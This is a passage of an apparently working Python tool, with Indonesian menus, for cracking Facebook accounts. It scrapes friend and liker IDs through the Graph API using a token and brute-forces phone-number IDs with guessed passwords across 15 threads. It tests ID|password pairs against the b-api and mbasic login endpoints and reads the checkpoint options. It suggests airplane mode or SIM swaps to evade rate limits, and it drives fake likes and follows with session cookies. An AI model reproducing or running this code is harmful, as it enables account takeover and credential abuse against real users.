	#print('\x1b[38;5;231m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Menu Tools Crack Fb')
	print("\x1b[38;5;231m├───────────────Alat────────────┐")
	print('\x1b[38;5;231m│>_Negara Kamu :\x1b[38;5;231m '+str(CN))
	print('\x1b[38;5;231m│>_Kartu SIM   :\x1b[38;5;231m '+str(CB))
	#print('\033[33m│>_Nama Kamu  : '+str(anjeng))
	#print('\033[33m│>_Tanggal Kamu  : '+str(anjengv4))
	#print('\033[33m│>_Teman Kamu  : '+str(anjengv2))
	#print('\033[33m│>_Id Kamu  : '+str(anjengv3))
	print('\x1b[38;5;231m│>_IP Kamu    :\x1b[38;5;231m '+str(IP))
	print('\x1b[38;5;231m│>_Token Kamu :\x1b[38;5;231m '+str(tokenku))
	print('\x1b[38;5;231m│>_Author : Hikmat X Lia')
	print("\x1b[38;5;231m├───────────────Alat────────────┘") 
	print('%s├ [01]>_Crack With Public'%(P))
	print('%s├ [02]>_Crack With %s[Massal]'%(P,h))
	print('%s├ [03]>_Crack With Grup %s(No Login)'%(P,h))
	print('%s├ [04]>_Bot Share Public'%(P))
	print('%s├ [05]>_Crack With Follower'%(P))
	print('%s├ [06]>_Ganti UserAgent'%(P))
	print('%s├ [07]>_Lihat Hasil Crack'%(P))
	print('%s├ [08]>_Check Opsi With %sCP'%(P,K))
	print('%s├ [09]>_Check Opsi With %sOK'%(P,h))
	print('%s├ [10]>_Crack With Email %s [Dalam Pengembangan]'%(P,h))
	print('%s├ [11]>_Crack With Nomor %s [Dalam Pengembangan]'%(P,h))
	print('%s├ [12]>_Crack With Followers%s [Massal]'%(P,h))
	print('%s├ [13]>_Crack With Likes%s [New/Test]'%(P,h))
	print('%s├ [14]>_Bot Facebook React Dll%s [Dalam Perbaikan]'%(P,h))
	print('%s├ [15]>_Crack With Public %sOld(04/10)%s [New/Test]'%(P,h,h))
	print('%s├ [15]>_Crack With Public %sOld(04/08)%s [New/Test]'%(P,h,h))
	print('%s├ [00]>_Exit'%(P))
	jh = input('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Pilih : ')
	if jh in ['1','01']:
		dump_publik()
	elif jh in ['2','02']:		
		dump_massal()
	elif jh in ['3','03']:
		grup()
	elif jh in ['4','04']:
		 main()
	elif jh in ['5','05']:
		follower()
	elif jh in ['6','06']:
		useragent()
	elif jh in ['7','07']:
		result()
	elif jh in ['8','08']:
		uacoy()
	elif jh in ['9','09']:
		uacoy2()
	elif jh in ['10','010']:
		#jalan('>_Fitur Ini Belum Tersedia!! ')
		#input('>_Back')
		krekmail() 
		#oldfoll()
	elif jh in ['11','011']:
		#jalan('>_Fitur Ini Belum Tersedia!! ')
		#input('>_Back')
		kreknomer()
		#likedd()
	elif jh in ['12','012']:
		dump_massal2() 
	elif jh in ['13','013']:
		#jalan('>_Fitur Ini Belum Tersedia!! ')
		#input('>_Back')
		likes() 
		#dumpidd()
	elif jh in ['14','014']:
		#jalan('>_Fitur Ini Belum Tersedia!! ')
		#2input('>_Back')
		logcok()
		#botefbi()
		#oldpub()
	elif jh in ['15','015']:
		#jalan('>_Fitur Ini Belum Tersedia!! ')
		#input('>_Back')
		dump_old() 
		#oldfoll()
	elif jh in ['16','016']:
		#jalan('>_Fitur Ini Belum Tersedia!! ')
		#input('>_Back')
		dump_old2() 
		#liked()
	#elif jh in ['17','017']:
		#jalan('>_Fitur Ini Belum Tersedia!! ')
		#input('>_Back')
		#menu() 
		#share()
	#elif jh in ['18','018']:
		#share()
	#elif jh in ['19','019']:
		#fritoken()
	elif jh in ['0','00']:
		os.system('rm -rf .token.txt')
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Tunggu ...')
		time.sleep(1)
		jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Berhasil Keluar') 
	else:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Pilih Yang Benar') 
		exit()

def dump_old2():
        try:
                token = open("token.txt","r").read()
        except IOError:
               # jalan(balmond+m+" Token Kadaluarsa")
              #  time.sleep(0.5)
                exit()
        old_gak.append("old")
        try:
                nada = int(input("\n"+balmond+l+" Mau Crack Berapa ID : "))
                if nada>10:
                        jalan(balmond+m+" Maksimal 10 ID")
                        time.sleep(0.5)
                        dump_old2()
        except ValueError:
                jalan(balmond+m+" Input Invalid")
                time.sleep(0.5)
                dump_old2()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(balmond+l+" Masukkan ID Target Ke %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(balmond+l+" Nama : "+tulul["name"])
                except KeyError:
                        print(balmond+m+" ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        print(balmond+l+" Total ID : "+h+"%s"%(len(non_old)))
                        print(balmond+l+" Total ID Old : "+h+"%s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        print(balmond+l+" Jumlah Total ID Old : "+h+"%s"%(len(id)))
       # os.system("rm -rf id.txt")
        setting()

def dump_old():
        try:
                token = open("token.txt","r").read()
       # print('Wait')
        except IOError:
                #jalan(balmond+m+" Token Kadaluarsa")
                #time.sleep(0.5)
                exit()
        old_gak.append("old")
        try:
                nada = int(input("\n"+balmond+l+" Mau Crack Berapa ID : "))
                if nada>10:
                        jalan(balmond+m+" Maksimal 10 ID")
                        time.sleep(0.5)
                        dump_old()
        except ValueError:
                jalan(balmond+m+" Input Invalid")
                time.sleep(0.5)
                dump_old()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(balmond+l+" Masukkan ID Target Ke %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(balmond+l+" Nama : "+tulul["name"])
                except KeyError:
                        print(balmond+m+" ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                elif len(jamet)==15 and jamet[4]=="0":
                                                        if jamet[5]=="0":
                                                                if jamet[6]=="0" or jamet[6]=="1" or jamet[6]=="2" or jamet[6]=="3" or jamet[6]=="4" or jamet[6]=="5" or jamet[6]=="6" or jamet[6]=="7" or jamet[6]=="8":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        print(balmond+l+" Total ID : "+h+"%s"%(len(non_old)))
                        print(balmond+l+" Total ID Old : "+h+"%s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        print(balmond+l+" Jumlah Total ID Old : "+h+"%s"%(len(id)))
      #  os.system("rm -rf id.txt")
        setting()

def botefbi():
    print('[01] earn credits')
    print('[02] add like post')
    print('[03] add followers')
    print('[00] exit')
    pilih_menu()

def pilih_menu():
    choice=input(f"{pr}Select : {c}")
    if choice == "00" or choice == "0":
       sys.exit(f"By bro jangan lupa kasih bintang github saya:)")
    elif choice == "01" or choice == "1":
       print(f"Press ctrl c to stop")
       print(f"-----------------------------------------------")
       while True:
           try:
               earn()
               sleep(1)
           except:
               break
       print()
       input(f"[ Press Enter To Back ]")
       exit()
    elif choice == "02" or choice == "2":
       pid=input(f"{er}Put your url post\n >>> ")
       print(f"{er}Press {c}ctrl c {p}to stop")
       print(f"-----------------------------------------------")
       while True:
           try:
               like(pid)
               sleep(3)
           except:
               break
       print()
       input(f"[ Press Enter To Back ]")
       exit()
    elif choice == "03" or choice == "3":
       uid=input(f"Put your url profile\n>>> ")
       print(f"Press ctrl c to stop")
       print(f"-----------------------------------------------")
       while True:
           try:
               follow(uid)
               sleep(3)
           except:
               break
       print()
       input(f"[ Press Enter To Back ]")
       menu()
      # os.system("python run.py")
    else:
       print(f"Pilih yg bener coeg")
       pilih_menu()

def earn():
    ua=agent()
    data={"user_id":id,"type":"FB","code":cokie}
    req=requests.post("https://rajecreation.com/rajeliker/v8/earn.php",data=data,headers=ua).text
    if "Credit added success!" in req:
       res=requests.post("https://rajecreation.com/rajeliker/v8/timer.php",data={"user_id":id,"type":"FB"},headers={"user-agent":usa,"content-type":"application/x-www-form-urlencoded; charset=utf-8","accept-encoding":"gzip","host":"rajecreation.com"}).json()
       print(f"\rCredit : "+str(res["active"]),end="")
       return res["active"]
    else:
       print(f"\rFailed earn credit")

def follow(url):
    ua=agent()
    limit=earn()
    req=requests.post("https://rajecreation.com/rajeliker/v8/checkURL.php",data={"url":url,"LoginWith":"FB","type":"FOLLOW","cookie":cokie},headers=ua).text
    if "Data loaded success!" in req:
       js=json.loads(req)
       data={"limit":limit,"LoginType":"FB","type":"FOLLOW","user_id":id,"post_id":js["data"]["id"],"cost":"1","cookie":cokie,"post_url":js["data"]["url"],"reaction":"1"}
       res=requests.post("https://rajecreation.com/rajeliker/v8/send.php",data=data,headers=ua).json()
       if res["data"]["count"] == 0:
          print(f"\rFailed add followers")
       else:
          nm=bs(ses.get(js["data"]["url"],cookies={"cookie":cokie}).text,"html.parser").find("title").text
          print(f'\rAdd followers to {nm}')
          sleep(10)
          tot=ses.get(f'https://mbasic.facebook.com/timeline/app_collection/?collection_token={js["data"]["id"]}%3A184985071538002%3A32&_rdr',cookies={"cookie":cokie}).text
          total=re.findall(r'<td valign="...">Pengikut</td><td valign="..." class=".."><span class="(.*?)">(.*?)</span>',tot)[0][1]
          print(f"Total Followers : {total}")
    else:
       print(f"\rProfile not found")
       sleep(2)
       menu()

def agent():
    us={"user-agent":usa,"version":"8.0.2","accept-encoding":"gzip","packagename":"com.datta.liker","device":"true","host":"rajecreation.com","appname":"Raje Liker","content-type":"application/x-www-form-urlencoded; charset=utf-8","versioncode":"18","id":"QQ3A.200605.002","token":"3075dda32ffbbe88"}
    return us


def like(url):
    ua=agent()
    limit=earn()
    req=requests.post("https://rajecreation.com/rajeliker/v8/checkURL.php",data={"url":url,"LoginWith":"FB","type":"LIKE","cookie":cokie},headers=ua).text
    if "Data loaded success!" in req:
        js=json.loads(req)
        res=requests.post("https://rajecreation.com/rajeliker/v8/send.php",data={"limit":limit,"LoginType":"FB","type":"LIKE","user_id":id,"post_id":js["data"]["id"],"cost":"1","cookie":cokie,"post_url":js["data"]["url"],"reaction":"1"},headers=ua).json()
        if res["data"]["count"] == 0:
           print(f"\r{er}Failed to add like")
        else:
           print(f'\r{dn}Add like to {c}{js["data"]["url"]}')
           sleep(10)
           tot=bs(ses.get(js["data"]["url"],cookies={"cookie":cokie}).text,"html.parser").find("a",href=lambda x: "/ufi/reaction/" in x)["href"]
           total=bs(ses.get(mbasic.format(tot),cookies={"cookie":cokie}).text,"html.parser").find("a",href=lambda x: "&reaction_type=1&" in x).find("span").text
           print(f"{pr}Total like : {c}{total}")
    else:
        print(f"\r{er}Post not found")
        sleep(2)
        menu()

def likes():
	token = open('.token.txt', 'r').read()
	print('│') 
	idt = input(x+'├['+h+'•'+x+'] Masukkan ID Postingan : ')
	try:
		jumlah = int(input(x+'├['+h+'•'+x+'] Masukan Limit : '))
		if jumlah>20000:
			print(x+'├['+h+'•'+x+'] MASUKKAN JUMLAH ID 20000')
			time.sleep(0.5)
			likes()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit="+str(jumlah)+"&access_token="+token)
		z = json.loads(r.text)
		for a in z['data']:
			idne = a['id']
			jenenge = a["name"]
			id.append(idne+'|'+jenenge)
	except KeyError:
		print('└PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK')
		exit()
	print('├TOTAL %s ID'%(len(id)))
	setting()

def kreknomer():
  data = []
  print((p+"\n ["+k+"•"+m+"•"+p+"] Number Must Be 5 Digit"))
  kode=str(input(p+" ["+k+"•"+m+"•"+p+"] Example : 92037\n"+p+" ["+k+"•"+m+"•"+p+"] Input Number: "))
  exit((p+"\n ["+k+"•"+m+"•"+p+"] Number Must Be 5 Digit")) if len(kode) < 5 else ''
  exit((p+"\n ["+k+"•"+m+"•"+p+"] Number Must Be 5 Digit")) if len(kode) > 5 else ''
  jml=int(input(p+" ["+k+"•"+m+"•"+p+"] Amount : "))
  [data.append({'idf': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(p+" ["+k+"•"+m+"•"+p+"] Crack Started, Please Wait...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['idf'], user['pw']): user for user in data}
  input(p+"\n [BACK]"+p)
  menu()

def uacoy():
	global cp
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Menu UserAgent ') 
	print('\x1b[38;5;226m► %s[01]%s>_UserAgent V1 '%(K,P)) 
	print('\x1b[38;5;46m► %s[02]%s>_UserAgent V2 '%(H,P))
	print('\x1b[38;5;226m► %s[03]%s>_UserAgent V3 '%(J,P))
	print('\x1b[38;5;226m► %s[04]%s>_UserAgent V2 '%(K,P))
	print('\x1b[38;5;226m► %s[05]%s>_UserAgent V5 '%(H,P))
	print('\x1b[38;5;226m► %s[00]%s>_Exit '%(M,P)) 
	fcgas = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Pilih  :  ') 
	if fcgas in ['1','01']:
		uav1() 
	elif fcgas in ['2','02']:
		uav2() 
	elif fcgas in ['3','03']:
		uav3() 
	elif fcgas in ['4','04']:
		uav4() 
	elif fcgas in ['5','05']:
		uav2() 
	elif fcgas in ['0','00']:
		menu() 

def uacoy2():
	global cp
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Menu UserAgent ') 
	print('\x1b[38;5;226m► %s[01]%s>_UserAgent V1 '%(K,P)) 
	print('\x1b[38;5;226m► %s[02]%s>_UserAgent V2 '%(H,P))
	print('\x1b[38;5;226m► %s[03]%s>_UserAgent V3 '%(J,P))
	print('\x1b[38;5;226m► %s[04]%s>_UserAgent V2 '%(K,P))
	print('\x1b[38;5;226m► %s[05]%s>_UserAgent V5 '%(H,P))
	print('\x1b[38;5;226m► %s[00]%s>_Exit '%(M,P)) 
	fcgas = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Pilih  :  ') 
	if fcgas in ['1','01']:
		uav1() 
	elif fcgas in ['2','02']:
		uav2() 
	elif fcgas in ['3','03']:
		uav3() 
	elif fcgas in ['4','04']:
		uav4() 
	elif fcgas in ['5','05']:
		uav2() 
	elif fcgas in ['0','00']:
		menu() 

def uav1():
	["Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"]
	metodff2()
def uav2():
	["Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"]
	metodff2()
def uav3():
	["Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"]
	metodff2()
def uav4():
	["Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16"]
	metodff2()
def uav5():
	["Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]"]
	metodff2()

def metodff2():
	jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;46m>_Pilih Methode') 
	print('\x1b[38;5;226m► %s[01]%s>_Methode b-api '%(K,P))
	print('\x1b[38;5;226m► %s[02]%s>_Methode mbasic '%(H,P))
	print('\x1b[38;5;226m► %s[03]%s>_Methode mobile '%(B,P)) 
	print('\x1b[38;5;226m► %s[04]%s>_Methode touch '%(U,P)) 
	print('\x1b[38;5;226m► %s[05]%s>_Methode x FB '%(J,P))
	print('\x1b[38;5;226m► %s[06]%s>_Methode free FB '%(O,P))
	print('\x1b[38;5;226m► %s[06]%s>_Methode d FB '%(U,P))
	print('\x1b[38;5;226m► %s[00]%s>_Exit '%(P,M))
	ggcoy = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[0;96m>_Pilih  : ') 
	if ggcoy in ['1','01']:
		gans()
	elif ggcoy in ['2','02']:
		gans2() 
	elif ggcoy in ['3','03']:
		gans3() 
	elif ggcoy in ['4','04']:
		gans4()
	elif ggcoy in ['5','05']:
		gans5()
	elif ggcoy in ['6','06']:
		gans6()
	elif ggcoy in ['7','07']:
		gans7()
	elif ggcoy in ['0','00']:
		jalan('>_Thanksss')
		exit()

def gans():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Check Opsi') 
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Akan DDicek') 
		geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►  >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilihan Tidak Ada Dimenu') 
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_File Tidak Ditemukan') 
				time.sleep(2)
				back()
def cek_opsi():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Proses Check Dimulai')
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \r%s >> %s >> Error      %s'%(B,kes,J))
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,B))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "b-api.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://b-api.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://b-api.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://b-api.facebook.com')
			ho = parser(ses.post('https://b-api.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://b-api.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(K,id,pw,J))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(J,H))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(G,opsii.text,J))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(H,id,pw,J))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(J,H))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,J))
				apkgey()
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(J,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah')
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres')
	exit()

def gans2():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Check Opsi') 
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Akan Dicek') 
		geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilihan Tidak Ada Dimenu') 
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi2()
			except IOError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_File Tidak Ditemukan') 
				time.sleep(2)
				back()
def cek_opsi2():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Proses Check Dimulai')
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(B,kes,J))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,B))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(K,id,pw,J))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(J,H))
					else:
						for opsii in opsi:
